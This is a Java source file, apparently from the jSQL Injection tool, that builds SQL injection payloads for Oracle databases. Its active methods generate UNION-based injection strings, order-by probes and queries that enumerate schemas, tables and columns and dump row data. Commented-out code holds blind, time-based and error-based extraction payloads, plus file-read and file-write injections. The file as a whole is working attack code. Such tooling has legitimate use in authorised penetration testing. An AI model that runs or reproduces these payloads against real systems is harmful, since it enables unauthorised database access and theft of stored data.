package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class OracleStrategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return "SELECT+rawtohex(version||'{%}'||SYS.DATABASE_NAME||'{%}'||user||'{%}'||user)||'i'FROM+v%24instance";
    }

    @Override
    public String getSchemaList() {
        return
            "select+" +
                "replace(" +
                    "replace(" +
                        "XmlAgg(" +
                            "XmlElement(\"a\",'hh'||rawtohex(owner)||'jj'||'30'||'hh')order+by+owner+nulls+last" +
                        ").getClobVal()," +
                    "'<a>','')," +
                "'<%2Fa>','gg')" +
                "||'i'" +
            "from(SELECT+distinct+owner+FROM+all_tables+where+1=1+{limit})";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select+" +
                "replace(" +
                    "replace(" +
                        "XmlAgg(" +
                            "XmlElement(\"a\",'hh'||rawtohex(table_name)||'jj'||'30'||'hh')order+by+table_name+nulls+last" +
                        ").getClobVal()," +
                    "'<a>','')," +
                "'<%2Fa>','gg')" +
                "||'i'" +
            "from(SELECT+distinct+table_name+FROM+all_tables+where+owner='" + database + "'{limit})";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select+" +
                "replace(" +
                    "replace(" +
                        "XmlAgg(" +
                            "XmlElement(\"a\",'hh'||rawtohex(column_name)||'jj'||'30'||'hh')order+by+column_name+nulls+last" +
                        ").getClobVal()," +
                    "'<a>','')," +
                "'<%2Fa>','gg')" +
                "||'i'" +
            "from(SELECT+distinct+column_name+FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'{limit})";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, ")||chr(127)||trim(");
        formatListColumn = "trim(" + formatListColumn + ")";
        
        return
            "select+" +
                "replace(" +
                    "replace(" +
                        "XmlAgg(" +
                            "XmlElement(\"a\",'hh'||rawtohex(" + formatListColumn + ")||'jj'||'30'||'hh')order+by+" + ToolsString.join(columns, ",") + "+nulls+last" +
                        ").getClobVal()," +
                    "'<a>','')," +
                "'<%2Fa>','gg')" +
                "||'i'" +
            "from(SELECT+distinct+" + ToolsString.join(columns, ",") + "+FROM+" + database + "." + table + "+where+1=1+{limit})";
    }

    @Override
    public String getPrivilege() {
        return "";
//        return 
//            "concat(" +
//                "(" +
//                    "select+" +
//                        "hex(" +
//                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
//                        ")" +
//                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
//                    "where+" +
//                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
//                        "and+PRIVILEGE_TYPE=0x46494c45" +
//                ")," +
//                "0x69" +
//            ")";
    }

    @Override
    public String readTextFile(String filePath) {
        return "";
//        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
    }

    @Override
    public String writeTextFile(String content, String filePath) {
        return "";
//        return 
//            MediatorModel.model().initialQuery
//                .replaceAll(
//                    "1337" + MediatorModel.model().visibleIndex + "7331",
//                    "(select+0x" + ToolsString.strhex(content) + ")"
//                )
//                .replaceAll("--++", "")
//                + "+into+outfile+\"" + filePath + "\"--+";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        return "";
//        return "0%2b1=1";
    }

    @Override
    public String blindCheck(String check) {
        return "";
//        return "+and+" + check + "--+";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        return "";
//        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        return "";
//        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String timeCheck(String check) {
        return "";
//        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        return "";
//        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        return "";
//        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        return "";
//        return 
//            "(" +
//                "select+" +
//                "concat(" +
//                    "0x53514c69," +
//                    "mid(" +
//                        "(" + sqlQuery + ")," +
//                        startPosition + "," +
//                        "65536" +
//                    ")" +
//                ")" +
//            ")";
    }

    @Override
    public String getErrorBasedStrategyCheck() {
        return "";
//        return 
//            "+and(" +
//                "select+1+" +
//                "from(" +
//                    "select+" +
//                        "count(*)," +
//                        "floor(rand(0)*2)" +
//                    "from+" +
//                        "information_schema.tables+" +
//                    "group+by+2" +
//                ")a" +
//            ")--+";
    }

    @Override
    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        return "";
//        return 
//            "+and" +
//                "(" +
//                "select+" +
//                    "1+" +
//                "from(" +
//                    "select+" +
//                        "count(*)," +
//                        "concat(" +
//                            "0x53514c69," +
//                            "mid(" +
//                                "(" + sqlQuery + ")," +
//                                startPosition + "," +
//                                "64" +
//                            ")," +
//                        "floor(rand(0)*2)" +
//                    ")" +
//                    "from+information_schema.tables+" +
//                    "group+by+2" +
//                ")a" +
//            ")--+";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
            "(" +
            "select+*+from(select+" +
                "replace('SQLi'||substr(" +
                    "(" + sqlQuery + ")," +
                    startPosition + "," +
                    "3996" +
                "),'SQLii','')from+dual)x" +
            ")";
    }

    @Override
    public String timeStrategy(String sqlQuery, String startPosition) {
        return "";
//        return 
//            "(" +
//                "select+" +
//                    "concat(" +
//                        "0x53514c69," +
//                        "mid(" +
//                            "(" + sqlQuery + ")," +
//                            startPosition + "," +
//                            "65536" +
//                        ")" +
//                    ")" +
//            ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select'SQLi'||rpad('#',1024,'#')||'iLQS'from+dual)"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("to_char(1337"+ i +"7330%2b1)");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "from+dual--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+and+rownum+between+" + limitSQLResult + "+and+65536";
    }

}